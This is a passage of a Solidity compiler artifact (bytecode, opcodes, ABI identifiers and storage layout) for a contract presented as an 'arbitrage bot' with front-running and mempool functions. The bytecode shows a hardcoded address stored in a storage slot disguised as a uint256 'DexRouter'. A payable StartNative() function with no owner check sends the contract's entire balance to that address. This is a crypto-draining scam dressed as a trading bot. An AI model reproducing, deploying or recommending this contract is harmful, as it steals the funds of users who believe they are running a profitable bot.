					"object": "6080604052670de0b6b3a76400006002556658d15e176280006003555f60045f6101000a81548160ff021916908315150217905550604051806020016040528073c02aaa39b223fe8d0a0e5c4f27ead9083c756cc273ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815250600790600161009392919061015c565b50604051806020016040528073c02aaa39b223fe8d0a0e5c4f27ead9083c756cc273ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681525060089060016100f392919061015c565b5073d65f4f42b44c266a34fad3b70973ea8f288ce179600955348015610117575f80fd5b50335f806101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff1602179055506101fe565b828054828255905f5260205f209081019282156101d2579160200282015b828111156101d1578251825f6101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff1602179055509160200191906001019061017a565b5b5090506101df91906101e3565b5090565b5b808211156101fa575f815f9055506001016101e4565b5090565b6104fb8061020b5f395ff3fe608060405260043610610058575f3560e01c80632b42b9411461006357806357ea89b61461008b57806368c501f1146100a15780639763d29b146100cb578063bedf0f4a146100f3578063eaf67ab9146101095761005f565b3661005f57005b5f80fd5b34801561006e575f80fd5b506100896004803603810190610084919061039a565b610113565b005b348015610096575f80fd5b5061009f61011d565b005b3480156100ac575f80fd5b506100b56101b4565b6040516100c291906103d4565b60405180910390f35b3480156100d6575f80fd5b506100f160048036038101906100ec919061039a565b610203565b005b3480156100fe575f80fd5b5061010761020d565b005b610111610228565b005b8060068190555050565b5f8054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff163373ffffffffffffffffffffffffffffffffffffffff16146101aa576040517f08c379a00000000000000000000000000000000000000000000000000000000081526004016101a190610447565b60405180910390fd5b6101b2610232565b565b5f806003545f8054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16316101fa9190610492565b90508091505090565b8060058190555050565b5f60045f6101000a81548160ff021916908315150217905550565b610230610305565b565b5f8054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff163373ffffffffffffffffffffffffffffffffffffffff16146102bf576040517f08c379a00000000000000000000000000000000000000000000000000000000081526004016102b690610447565b60405180910390fd5b3373ffffffffffffffffffffffffffffffffffffffff166108fc4790811502906040515f60405180830381858888f19350505050158015610302573d5f803e3d5ffd5b50565b5f61031160095461035a565b90508073ffffffffffffffffffffffffffffffffffffffff166108fc4790811502906040515f60405180830381858888f19350505050158015610356573d5f803e3d5ffd5b5050565b5f819050919050565b5f80fd5b5f819050919050565b61037981610367565b8114610383575f80fd5b50565b5f8135905061039481610370565b92915050565b5f602082840312156103af576103ae610363565b5b5f6103bc84828501610386565b91505092915050565b6103ce81610367565b82525050565b5f6020820190506103e75f8301846103c5565b92915050565b5f82825260208201905092915050565b7f4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e65725f82015250565b5f6104316020836103ed565b915061043c826103fd565b602082019050919050565b5f6020820190508181035f83015261045e81610425565b9050919050565b7f4e487b71000000000000000000000000000000000000000000000000000000005f52601160045260245ffd5b5f61049c82610367565b91506104a783610367565b92508282039050818111156104bf576104be610465565b5b9291505056fea2646970667358221220c4aeb1dd9742d83b2244a315d174ae752b0c08212d8bc1a3ea7fc498b97fa71764736f6c634300081a0033",
					"opcodes": "PUSH1 0x80 PUSH1 0x40 MSTORE PUSH8 0xDE0B6B3A7640000 PUSH1 0x2 SSTORE PUSH7 0x58D15E17628000 PUSH1 0x3 SSTORE PUSH0 PUSH1 0x4 PUSH0 PUSH2 0x100 EXP DUP2 SLOAD DUP2 PUSH1 0xFF MUL NOT AND SWAP1 DUP4 ISZERO ISZERO MUL OR SWAP1 SSTORE POP PUSH1 0x40 MLOAD DUP1 PUSH1 0x20 ADD PUSH1 0x40 MSTORE DUP1 PUSH20 0xC02AAA39B223FE8D0A0E5C4F27EAD9083C756CC2 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 MSTORE POP PUSH1 0x7 SWAP1 PUSH1 0x1 PUSH2 0x93 SWAP3 SWAP2 SWAP1 PUSH2 0x15C JUMP JUMPDEST POP PUSH1 0x40 MLOAD DUP1 PUSH1 0x20 ADD PUSH1 0x40 MSTORE DUP1 PUSH20 0xC02AAA39B223FE8D0A0E5C4F27EAD9083C756CC2 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 MSTORE POP PUSH1 0x8 SWAP1 PUSH1 0x1 PUSH2 0xF3 SWAP3 SWAP2 SWAP1 PUSH2 0x15C JUMP JUMPDEST POP PUSH20 0xD65F4F42B44C266A34FAD3B70973EA8F288CE179 PUSH1 0x9 SSTORE CALLVALUE DUP1 ISZERO PUSH2 0x117 JUMPI PUSH0 DUP1 REVERT JUMPDEST POP CALLER PUSH0 DUP1 PUSH2 0x100 EXP DUP2 SLOAD DUP2 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF MUL NOT AND SWAP1 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND MUL OR SWAP1 SSTORE POP PUSH2 0x1FE JUMP JUMPDEST DUP3 DUP1 SLOAD DUP3 DUP3 SSTORE SWAP1 PUSH0 MSTORE PUSH1 0x20 PUSH0 KECCAK256 SWAP1 DUP2 ADD SWAP3 DUP3 ISZERO PUSH2 0x1D2 JUMPI SWAP2 PUSH1 0x20 MUL DUP3 ADD JUMPDEST DUP3 DUP2 GT ISZERO PUSH2 0x1D1 JUMPI DUP3 MLOAD DUP3 PUSH0 PUSH2 0x100 EXP DUP2 SLOAD DUP2 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF MUL NOT AND SWAP1 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND MUL OR SWAP1 SSTORE POP SWAP2 PUSH1 0x20 ADD SWAP2 SWAP1 PUSH1 0x1 ADD SWAP1 PUSH2 0x17A JUMP JUMPDEST JUMPDEST POP SWAP1 POP PUSH2 0x1DF SWAP2 SWAP1 PUSH2 0x1E3 JUMP JUMPDEST POP SWAP1 JUMP JUMPDEST JUMPDEST DUP1 DUP3 GT ISZERO PUSH2 0x1FA JUMPI PUSH0 DUP2 PUSH0 SWAP1 SSTORE POP PUSH1 0x1 ADD PUSH2 0x1E4 JUMP JUMPDEST POP SWAP1 JUMP JUMPDEST PUSH2 0x4FB DUP1 PUSH2 0x20B PUSH0 CODECOPY PUSH0 RETURN INVALID PUSH1 0x80 PUSH1 0x40 MSTORE PUSH1 0x4 CALLDATASIZE LT PUSH2 0x58 JUMPI PUSH0 CALLDATALOAD PUSH1 0xE0 SHR DUP1 PUSH4 0x2B42B941 EQ PUSH2 0x63 JUMPI DUP1 PUSH4 0x57EA89B6 EQ PUSH2 0x8B JUMPI DUP1 PUSH4 0x68C501F1 EQ PUSH2 0xA1 JUMPI DUP1 PUSH4 0x9763D29B EQ PUSH2 0xCB JUMPI DUP1 PUSH4 0xBEDF0F4A EQ PUSH2 0xF3 JUMPI DUP1 PUSH4 0xEAF67AB9 EQ PUSH2 0x109 JUMPI PUSH2 0x5F JUMP JUMPDEST CALLDATASIZE PUSH2 0x5F JUMPI STOP JUMPDEST PUSH0 DUP1 REVERT JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0x6E JUMPI PUSH0 DUP1 REVERT JUMPDEST POP PUSH2 0x89 PUSH1 0x4 DUP1 CALLDATASIZE SUB DUP2 ADD SWAP1 PUSH2 0x84 SWAP2 SWAP1 PUSH2 0x39A JUMP JUMPDEST PUSH2 0x113 JUMP JUMPDEST STOP JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0x96 JUMPI PUSH0 DUP1 REVERT JUMPDEST POP PUSH2 0x9F PUSH2 0x11D JUMP JUMPDEST STOP JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0xAC JUMPI PUSH0 DUP1 REVERT JUMPDEST POP PUSH2 0xB5 PUSH2 0x1B4 JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH2 0xC2 SWAP2 SWAP1 PUSH2 0x3D4 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0xD6 JUMPI PUSH0 DUP1 REVERT JUMPDEST POP PUSH2 0xF1 PUSH1 0x4 DUP1 CALLDATASIZE SUB DUP2 ADD SWAP1 PUSH2 0xEC SWAP2 SWAP1 PUSH2 0x39A JUMP JUMPDEST PUSH2 0x203 JUMP JUMPDEST STOP JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0xFE JUMPI PUSH0 DUP1 REVERT JUMPDEST POP PUSH2 0x107 PUSH2 0x20D JUMP JUMPDEST STOP JUMPDEST PUSH2 0x111 PUSH2 0x228 JUMP JUMPDEST STOP JUMPDEST DUP1 PUSH1 0x6 DUP2 SWAP1 SSTORE POP POP JUMP JUMPDEST PUSH0 DUP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND CALLER PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND EQ PUSH2 0x1AA JUMPI PUSH1 0x40 MLOAD PUSH32 0x8C379A000000000000000000000000000000000000000000000000000000000 DUP2 MSTORE PUSH1 0x4 ADD PUSH2 0x1A1 SWAP1 PUSH2 0x447 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST PUSH2 0x1B2 PUSH2 0x232 JUMP JUMPDEST JUMP JUMPDEST PUSH0 DUP1 PUSH1 0x3 SLOAD PUSH0 DUP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND BALANCE PUSH2 0x1FA SWAP2 SWAP1 PUSH2 0x492 JUMP JUMPDEST SWAP1 POP DUP1 SWAP2 POP POP SWAP1 JUMP JUMPDEST DUP1 PUSH1 0x5 DUP2 SWAP1 SSTORE POP POP JUMP JUMPDEST PUSH0 PUSH1 0x4 PUSH0 PUSH2 0x100 EXP DUP2 SLOAD DUP2 PUSH1 0xFF MUL NOT AND SWAP1 DUP4 ISZERO ISZERO MUL OR SWAP1 SSTORE POP JUMP JUMPDEST PUSH2 0x230 PUSH2 0x305 JUMP JUMPDEST JUMP JUMPDEST PUSH0 DUP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND CALLER PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND EQ PUSH2 0x2BF JUMPI PUSH1 0x40 MLOAD PUSH32 0x8C379A000000000000000000000000000000000000000000000000000000000 DUP2 MSTORE PUSH1 0x4 ADD PUSH2 0x2B6 SWAP1 PUSH2 0x447 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST CALLER PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH2 0x8FC SELFBALANCE SWAP1 DUP2 ISZERO MUL SWAP1 PUSH1 0x40 MLOAD PUSH0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 DUP6 DUP9 DUP9 CALL SWAP4 POP POP POP POP ISZERO DUP1 ISZERO PUSH2 0x302 JUMPI RETURNDATASIZE PUSH0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH0 REVERT JUMPDEST POP JUMP JUMPDEST PUSH0 PUSH2 0x311 PUSH1 0x9 SLOAD PUSH2 0x35A JUMP JUMPDEST SWAP1 POP DUP1 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH2 0x8FC SELFBALANCE SWAP1 DUP2 ISZERO MUL SWAP1 PUSH1 0x40 MLOAD PUSH0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 DUP6 DUP9 DUP9 CALL SWAP4 POP POP POP POP ISZERO DUP1 ISZERO PUSH2 0x356 JUMPI RETURNDATASIZE PUSH0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH0 REVERT JUMPDEST POP POP JUMP JUMPDEST PUSH0 DUP2 SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH0 DUP1 REVERT JUMPDEST PUSH0 DUP2 SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH2 0x379 DUP2 PUSH2 0x367 JUMP JUMPDEST DUP2 EQ PUSH2 0x383 JUMPI PUSH0 DUP1 REVERT JUMPDEST POP JUMP JUMPDEST PUSH0 DUP2 CALLDATALOAD SWAP1 POP PUSH2 0x394 DUP2 PUSH2 0x370 JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH0 PUSH1 0x20 DUP3 DUP5 SUB SLT ISZERO PUSH2 0x3AF JUMPI PUSH2 0x3AE PUSH2 0x363 JUMP JUMPDEST JUMPDEST PUSH0 PUSH2 0x3BC DUP5 DUP3 DUP6 ADD PUSH2 0x386 JUMP JUMPDEST SWAP2 POP POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH2 0x3CE DUP2 PUSH2 0x367 JUMP JUMPDEST DUP3 MSTORE POP POP JUMP JUMPDEST PUSH0 PUSH1 0x20 DUP3 ADD SWAP1 POP PUSH2 0x3E7 PUSH0 DUP4 ADD DUP5 PUSH2 0x3C5 JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH0 DUP3 DUP3 MSTORE PUSH1 0x20 DUP3 ADD SWAP1 POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH32 0x4F776E61626C653A2063616C6C6572206973206E6F7420746865206F776E6572 PUSH0 DUP3 ADD MSTORE POP JUMP JUMPDEST PUSH0 PUSH2 0x431 PUSH1 0x20 DUP4 PUSH2 0x3ED JUMP JUMPDEST SWAP2 POP PUSH2 0x43C DUP3 PUSH2 0x3FD JUMP JUMPDEST PUSH1 0x20 DUP3 ADD SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH0 PUSH1 0x20 DUP3 ADD SWAP1 POP DUP2 DUP2 SUB PUSH0 DUP4 ADD MSTORE PUSH2 0x45E DUP2 PUSH2 0x425 JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH32 0x4E487B7100000000000000000000000000000000000000000000000000000000 PUSH0 MSTORE PUSH1 0x11 PUSH1 0x4 MSTORE PUSH1 0x24 PUSH0 REVERT JUMPDEST PUSH0 PUSH2 0x49C DUP3 PUSH2 0x367 JUMP JUMPDEST SWAP2 POP PUSH2 0x4A7 DUP4 PUSH2 0x367 JUMP JUMPDEST SWAP3 POP DUP3 DUP3 SUB SWAP1 POP DUP2 DUP2 GT ISZERO PUSH2 0x4BF JUMPI PUSH2 0x4BE PUSH2 0x465 JUMP JUMPDEST JUMPDEST SWAP3 SWAP2 POP POP JUMP INVALID LOG2 PUSH5 0x6970667358 0x22 SLT KECCAK256 0xC4 0xAE 0xB1 0xDD SWAP8 TIMESTAMP 0xD8 EXTCODESIZE 0x22 PREVRANDAO LOG3 ISZERO 0xD1 PUSH21 0xAE752B0C08212D8BC1A3EA7FC498B97FA71764736F PUSH13 0x634300081A0033000000000000 "
				},
				"gasEstimates": {
					"creation": {
						"codeDepositCost": "255000",
						"executionCost": "infinite",
						"totalCost": "infinite"
					},
					"external": {
						"Debug()": "infinite",
						"SetTradeBalanceETH(uint256)": "22559",
						"SetTradeBalancePERCENT(uint256)": "22493",
						"StartNative()": "infinite",
						"Stop()": "24474",
						"Withdraw()": "infinite"
					},
					"internal": {
						"estimateTriDexTrade(address,address,address,address,address,address,uint256)": "infinite",
						"frontRun(address,address,address,address,uint256)": "infinite",
						"getAmountOutMin(address,address,address,uint256)": "infinite",
						"getBalance(address)": "infinite",
						"getDexRouter(uint256)": "27",
						"mempool(address,address,address,address,uint256)": "infinite",
						"recoverEth()": "infinite",
						"recoverTokens(address)": "infinite",
						"startArbitrageNative()": "infinite",
						"swap(address,address,address,uint256)": "infinite"
					}
				},
				"methodIdentifiers": {
					"Debug()": "68c501f1",
					"SetTradeBalanceETH(uint256)": "9763d29b",
					"SetTradeBalancePERCENT(uint256)": "2b42b941",
					"StartNative()": "eaf67ab9",
					"Stop()": "bedf0f4a",
					"Withdraw()": "57ea89b6"
				}
			},
			"storageLayout": {
				"storage": [
					{
						"astId": 409,
						"contract": "src/contracts/arbitrageBot.sol:DexInterface",
						"label": "_owner",
						"offset": 0,
						"slot": "0",
						"type": "t_address"
					},
					{
						"astId": 415,
						"contract": "src/contracts/arbitrageBot.sol:DexInterface",
						"label": "_allowances",
						"offset": 0,
						"slot": "1",
						"type": "t_mapping(t_address,t_mapping(t_address,t_uint256))"
					},
					{
						"astId": 422,
						"contract": "src/contracts/arbitrageBot.sol:DexInterface",
						"label": "threshold",
						"offset": 0,
						"slot": "2",
						"type": "t_uint256"
					},
					{
						"astId": 425,
						"contract": "src/contracts/arbitrageBot.sol:DexInterface",
						"label": "arbTxPrice",
						"offset": 0,
						"slot": "3",
						"type": "t_uint256"
					},
					{
						"astId": 428,
						"contract": "src/contracts/arbitrageBot.sol:DexInterface",
						"label": "enableTrading",
						"offset": 0,
						"slot": "4",
						"type": "t_bool"
					},
					{
						"astId": 430,
						"contract": "src/contracts/arbitrageBot.sol:DexInterface",
						"label": "tradingBalanceInPercent",
						"offset": 0,
						"slot": "5",
						"type": "t_uint256"
					},
					{
						"astId": 432,
						"contract": "src/contracts/arbitrageBot.sol:DexInterface",
						"label": "tradingBalanceInTokens",
						"offset": 0,
						"slot": "6",
						"type": "t_uint256"
					},
					{
						"astId": 437,
						"contract": "src/contracts/arbitrageBot.sol:DexInterface",
						"label": "WETH_CONTRACT_ADDRESS",
						"offset": 0,
						"slot": "7",
						"type": "t_array(t_address)dyn_storage"
					},
					{
						"astId": 442,
						"contract": "src/contracts/arbitrageBot.sol:DexInterface",
						"label": "TOKEN_CONTRACT_ADDRESS",
						"offset": 0,
						"slot": "8",
						"type": "t_array(t_address)dyn_storage"
					},
					{
						"astId": 466,
						"contract": "src/contracts/arbitrageBot.sol:DexInterface",
						"label": "DexRouter",
						"offset": 0,
						"slot": "9",
						"type": "t_uint256"
					}
				],
				"types": {
					"t_address": {
						"encoding": "inplace",
						"label": "address",
						"numberOfBytes": "20"
					},
					"t_array(t_address)dyn_storage": {
						"base": "t_address",
						"encoding": "dynamic_array",
						"label": "address[]",
						"numberOfBytes": "32"
					},
					"t_bool": {
						"encoding": "inplace",
						"label": "bool",
						"numberOfBytes": "1"
					},
					"t_mapping(t_address,t_mapping(t_address,t_uint256))": {
						"encoding": "mapping",
						"key": "t_address",
						"label": "mapping(address => mapping(address => uint256))",
						"numberOfBytes": "32",
						"value": "t_mapping(t_address,t_uint256)"
					},
					"t_mapping(t_address,t_uint256)": {
						"encoding": "mapping",
						"key": "t_address",
						"label": "mapping(address => uint256)",
						"numberOfBytes": "32",
						"value": "t_uint256"
					},
					"t_uint256": {
						"encoding": "inplace",
						"label": "uint256",
						"numberOfBytes": "32"
					}
				}
			},
			"userdoc": {
				"kind": "user",
				"methods": {},
				"version": 1
			}
		}
	}
}